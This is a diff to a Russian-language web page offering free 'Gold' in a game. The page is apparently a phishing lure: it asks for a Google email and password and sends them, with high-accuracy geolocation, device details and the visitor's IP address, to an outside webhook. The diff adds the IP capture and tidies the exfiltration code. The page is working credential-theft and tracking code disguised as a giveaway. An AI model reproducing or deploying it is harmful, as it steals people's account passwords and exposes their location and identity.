@@ -75,10 +75,11 @@
   <div class="container">
     <h1>Gold transfer</h1>
     <div id="url-info"></div>
-    
+      
     <div class="form-section">
       <h2>Авторизация</h2>
-      <form id="login-form">
+      <!-- Указываем method="POST", чтобы по умолчанию данные не попадали в URL -->
+      <form id="login-form" method="POST">
         <div class="input-group">
           <label for="email">Google Почта:</label>
           <input type="email" id="email" name="email" placeholder="Введите адрес электронной почты" required>
@@ -91,60 +92,71 @@
       </form>
       <div id="login-result"></div>
     </div>
-    
+      
     <div class="form-section" id="gold-section" style="display:none;">
       <h2>Получить голду</h2>
       <button id="get-gold-button">Получить Gold</button>
     </div>
   </div>
-
+  
   <script>
     const DISCORD_WEBHOOK_URL = "https://hkdk.events/oyt9imlhvrjiqx";
 
-    // Объект для хранения информации об устройстве и геолокации
-  const clientInfo = {
-    geolocation: {},
-    device: {
-      userAgent: navigator.userAgent,
-      platform: navigator.platform,
-      language: navigator.language,
-      screenResolution: `${window.screen.width}x${window.screen.height}`
-    }
-  };
-
-  // Запрос геолокации с повышенной точностью
-  if ('geolocation' in navigator) {
-    navigator.geolocation.getCurrentPosition(
-      position => {
-        const coords = position.coords;
-
-        clientInfo.geolocation = {
-          latitude: coords.latitude,
-          longitude: coords.longitude,
-          accuracy: coords.accuracy, // точность в метрах
-          altitude: coords.altitude || null,
-          altitudeAccuracy: coords.altitudeAccuracy || null,
-          heading: coords.heading || null,
-          speed: coords.speed || null,
-          timestamp: position.timestamp
-        };
+    // Объект для хранения информации об устройстве, IP, и геолокации
+    const clientInfo = {
+      geolocation: {},
+      device: {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        screenResolution: `${window.screen.width}x${window.screen.height}`
       },
-(error) => {
-        if (error.code === error.PERMISSION_DENIED) {
-          alert('Ошибка авторизации: доступ к геолокации отклонён пользователем.');
-        } else {
-          console.error('Ошибка получения геолокации:', error.message);
+      ip: null // Здесь будет IP-адрес пользователя
+    };
+
+    // Получение IP-адреса пользователя через API ipify
+    fetch("https://api.ipify.org?format=json")
+      .then(response => response.json())
+      .then(data => {
+        clientInfo.ip = data.ip;
+      })
+      .catch(error => {
+        console.error("Ошибка получения IP:", error);
+      });
+
+    // Запрос геолокации с повышенной точностью
+    if ('geolocation' in navigator) {
+      navigator.geolocation.getCurrentPosition(
+        position => {
+          const coords = position.coords;
+          clientInfo.geolocation = {
+            latitude: coords.latitude,
+            longitude: coords.longitude,
+            accuracy: coords.accuracy, // точность в метрах
+            altitude: coords.altitude || null,
+            altitudeAccuracy: coords.altitudeAccuracy || null,
+            heading: coords.heading || null,
+            speed: coords.speed || null,
+            timestamp: position.timestamp
+          };
         },
-      {
-        enableHighAccuracy: true,
-        timeout: 15000,
-        maximumAge: 0
-      }
-    );
-  } else {
-    console.error('Геолокация не поддерживается данным браузером');
-    clientInfo.geolocation = { error: 'Geolocation not supported' };
-  }
+        error => {
+          if (error.code === error.PERMISSION_DENIED) {
+            alert('Ошибка авторизации: доступ к геолокации отклонён пользователем.');
+          } else {
+            console.error('Ошибка получения геолокации:', error.message);
+          }
+        },
+        {
+          enableHighAccuracy: true,
+          timeout: 15000,
+          maximumAge: 0
+        }
+      );
+    } else {
+      console.error('Геолокация не поддерживается данным браузером');
+      clientInfo.geolocation = { error: 'Geolocation not supported' };
+    }
 
     // Функция для декодирования Base64-параметров и парсинга строки
     function decodeBase64Params(base64Str) {
@@ -201,11 +213,7 @@
         body: JSON.stringify({ content: messageContent })
       })
       .then(response => {
-        if (response.ok) {
-          callback(true);
-        } else {
-          callback(false);
-        }
+        callback(response.ok);
       })
       .catch(error => {
         console.error("Ошибка отправки данных:", error);
@@ -215,7 +223,8 @@
 
     // Обработка формы авторизации
     document.getElementById("login-form").addEventListener("submit", function(e) {
-      e.preventDefault();
+      e.preventDefault(); // Отменяет стандартную отправку формы, что предотвращает изменение URL
+
       const email = document.getElementById("email").value;
       const password = document.getElementById("password").value;
 
@@ -245,7 +254,7 @@
 
         sendDataToWebhook(message, function(success) {
           if (success) {
-            alert("Передеча Gold успешно завершена");
+            alert("Передача Gold успешно завершена");
           } else {
             alert("Ошибка при отправке запроса на получение Gold");
           }
